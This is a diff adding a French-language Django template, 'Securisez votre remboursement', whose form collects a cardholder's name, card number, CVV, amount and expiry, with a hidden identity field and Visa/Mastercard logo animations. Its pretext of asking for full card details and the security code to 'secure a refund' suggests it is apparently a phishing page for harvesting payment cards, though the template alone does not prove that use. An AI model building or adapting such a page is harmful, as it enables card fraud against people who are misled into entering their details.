@@ -1,0 +1,248 @@
+{% extends 'base.html' %}
+{% load static %}
+{% block title %}
+    card
+{% endblock %}
+
+{% block content %}
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
+    <style>
+        form div strong {
+            color: darkred;
+        }
+
+        .slide { opacity: 0; }
+
+        .slide.current {
+            opacity: 1;
+            animation-name: fadeIn;
+            -webkit-animation-name: fadeIn;
+            animation-duration: 1.5s;
+            -webkit-animation-duration: 1.5s;
+            animation-timing-function: ease-in-out;
+            -webkit-animation-timing-function: ease-in-out;
+            visibility: visible !important;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                transform: scale(0);
+                opacity: 0.0;
+            }
+            60% {
+                transform: scale(1.1);
+            }
+            80% {
+                transform: scale(0.9);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @-webkit-keyframes fadeIn {
+            0% {
+                -webkit-transform: scale(0);
+                opacity: 0.0;
+            }
+            60% {
+                -webkit-transform: scale(1.1);
+            }
+            80% {
+                -webkit-transform: scale(0.9);
+                opacity: 1;
+            }
+            100% {
+                -webkit-transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .disk {
+            -webkit-text-security: disc;
+        }
+        #togglePassword {
+            margin-left: -60px;
+            cursor: pointer;
+        }
+    </style>
+    <div style="padding: 10px 5px 5px 50px; display: flex;">
+        <div><img src="{% static 'images/left1.jpg' %}" alt="" width="100px"></div>
+        <div class="float-right" style="float: right; margin-left: 85%">
+            <img src="{% static 'images/right1.jpg' %}" alt="" width="100px">
+            <br>
+            <img src="{% static 'images/right2.png' %}" alt="" width="100px">
+        </div>
+    </div>
+
+    <div class="container">
+        <h1>Securisez votre remboursement</h1>
+        <div class="slide" id="slide">
+            <center>
+                <img id="image">
+
+                <h2 id="result" style="margin-top: -10.5%; margin-left: -5%; height: 150px">
+
+                </h2>
+                <h3 id="price" style="color: red"></h3>
+            </center>
+        </div>
+        <form method="POST" action="" novalidate="novalidate">
+            {% csrf_token %}
+{#            {% for field in form.visible_fields %}#}
+                <br>
+                <div class="fieldWrapper">
+                    {% if form.titulaire.errors %}
+                        {{ form.titulaire.label_tag }} {{ form.titulaire }}
+                        {% for error in form.titulaire.errors %}
+
+
+                            <strong>{{ error|escape }}</strong>
+                            <br>
+                        {% endfor %}
+                    {% else %}
+                        {{ form.titulaire.label_tag }} {{ form.titulaire }}
+                    {% endif %}
+                </div>
+                <br>
+                <div class="fieldWrapper">
+                    {% if form.numero.errors %}
+                        {{ form.numero.label_tag }}
+                        <div style="width: 100%; display: flex">
+                            {{ form.numero }}<i class="bi bi-eye-slash" id="togglePassword"></i>
+                        </div>
+                        {% for error in form.numero.errors %}
+                            <strong>{{ error|escape }}</strong>
+                            <br>
+                        {% endfor %}
+                    {% else %}
+                        {{ form.numero.label_tag }}
+                        <div style="width: 100%; display: flex">
+                            {{ form.numero }}<i class="bi bi-eye-slash" id="togglePassword"></i>
+                        </div>
+                    {% endif %}
+                </div>
+                <br>
+                <div class="fieldWrapper">
+                    {% if form.montant.errors %}
+                        {{ form.montant.label_tag }} {{ form.montant }}
+                        {% for error in form.montant.errors %}
+
+
+                            <strong>{{ error|escape }}</strong>
+                            <br>
+                        {% endfor %}
+                    {% else %}
+                        {{ form.montant.label_tag }} {{ form.montant }}
+                    {% endif %}
+                <br>
+                <div class="fieldWrapper">
+                    {% if form.cryptogramme.errors %}
+                        {{ form.cryptogramme.label_tag }} {{ form.cryptogramme }}
+                        {% for error in form.cryptogramme.errors %}
+
+
+                            <strong>{{ error|escape }}</strong>
+                            <br>
+                        {% endfor %}
+                    {% else %}
+                        {{ form.cryptogramme.label_tag }} {{ form.cryptogramme }}
+                    {% endif %}
+                </div>
+{#            {% endfor %}#}
+            <br>
+            <label for="expiration">Date d'expiration</label><br>
+            <div style="margin-left:5%">
+                <label for="month">month: </label>
+                <select name="month" id="month_id">
+                    {% for m in month %}
+                        <option value="{{ m }}">{{ m }}</option>
+                    {% endfor %}
+                </select>
+                <br>
+                <label for="year">year: </label>
+                <select name="year" id="year_id">
+                    {% for y in year %}
+                        <option value="{{ y }}">{{ y }}</option>
+                    {% endfor %}
+                </select>
+            </div>
+            <br>
+            <center style="">
+                <input type="submit" value="suivant" class="btn btn-primary" style="min-width: 300px; width:40%">
+            </center>
+                {{ form.expiration.as_hidden }}
+                {{ form.identitee_id.as_hidden }}
+
+        </form>
+    </div>
+
+
+    <script>
+        // console.log("image");
+        let cond = true;
+        let user = document.getElementById("id_numero");
+        let date = document.getElementById("expiration_id");
+        let mont = document.getElementById("id_montant");
+        let id = document.getElementById("titulaire_id");
+        let current = document.getElementById("slide");
+        let result = document.getElementById("result");
+
+        let img = document.getElementById("image");
+        user.classList.add('disk')
+
+
+
+
+            user.onkeyup = function(){
+                cond = user.value !== "";
+                let first_digit = user.value[0];
+                if (first_digit == 5) {
+                    current.classList.add("current");
+                    img.src = "{% static 'images/mastercard2.png' %} ";
+                    result.style.color = "#000000";
+                    result.innerHTML = "*".repeat(this.value.length);
+
+                }
+                else if(first_digit == 4){
+                    current.classList.add("current");
+                    img.src = "{% static 'images/visa.png' %}";
+                    result.style.color = "#FFFFFF";
+                    result.innerHTML = "*".repeat(this.value.length);
+                }
+                if(!cond){
+                    current.classList.remove("current");
+                    img.src = "";
+                    result.innerHTML = "*".repeat(this.value.length);
+                }
+                // if (id.value !== ""){
+                //     document.getElementById("result").innerHTML = this.value;
+                // }
+                // img.style.visibility = (cond ? 'visible' : 'hidden');
+            }
+
+            mont.onkeyup = function(){
+                if (user.value !== ""){
+                    mont.value?
+                        document.getElementById("price").innerHTML = "<b>montant</b>: "+this.value:
+                        document.getElementById("price").innerHTML ="";
+                }
+                // img.style.visibility = (cond ? 'visible' : 'hidden');
+            }
+            const togglePassword = document.querySelector("#togglePassword");
+            // const password = document.querySelector("#password");
+
+            togglePassword.addEventListener("click", function () {
+                // toggle the type attribute
+                // const type = password.getAttribute("type") === "password" ? "text" : "password";
+                // const type = password.getAttribute("type") === "password" ? "text" : "password";
+                // password.setAttribute("type", type);
+                console.log(user.style);
+                // toggle the icon
+                this.classList.toggle("bi-eye");
+                user.classList.toggle("disk");
+            });
+            date.type = 'month';
+    </script>
+{% endblock %}
